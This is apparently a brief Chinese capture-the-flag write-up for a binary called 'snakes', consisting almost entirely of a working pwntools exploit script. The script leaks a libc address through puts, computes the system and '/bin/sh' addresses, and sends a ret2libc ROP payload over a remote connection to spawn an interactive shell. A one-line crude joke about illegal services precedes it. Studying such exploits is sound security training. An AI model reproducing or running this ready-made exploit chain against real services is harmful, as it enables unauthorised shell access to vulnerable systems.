
标准的ROP  
不过首先需要找几号技师提供非法服务  

```python
from pwn import *
import binascii

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
debug = 0

env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc-2.23.so")}

if debug:
    p = process("./snakes", env=env)
else:
    p = remote("35.237.220.217", 1338)

libc = ELF("./libc-2.23.so")
elf = ELF("./snakes")
#gdb.attach(proc.pidof(p)[0])
pwnme = 0x804856d
libc_start_main_got = elf.got['__libc_start_main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

p.sendlineafter('(seperated by newline)', "51")
payload = flat(['A' * 48, puts_plt, pwnme, libc_start_main_got])
p.sendline(payload)
p.recvline()

libc_start_main_addr = u32(p.recvline()[:4])
p.sendlineafter('(seperated by newline)', "51")
print "__libc:", (libc_start_main_addr)
system_addr = libc_start_main_addr - (libc.symbols['__libc_start_main'] - libc.symbols['system'])
binsh_addr = libc_start_main_addr - (libc.symbols['__libc_start_main'] - next(libc.search("/bin/sh")))
print 'system_addr: ' + hex(system_addr)
print 'binsh_addr: ' + hex(binsh_addr)

payload = flat(['A' * 48, p32(system_addr) ,p32(pwnme), p32(binsh_addr)])
p.sendline(payload)
p.interactive()
```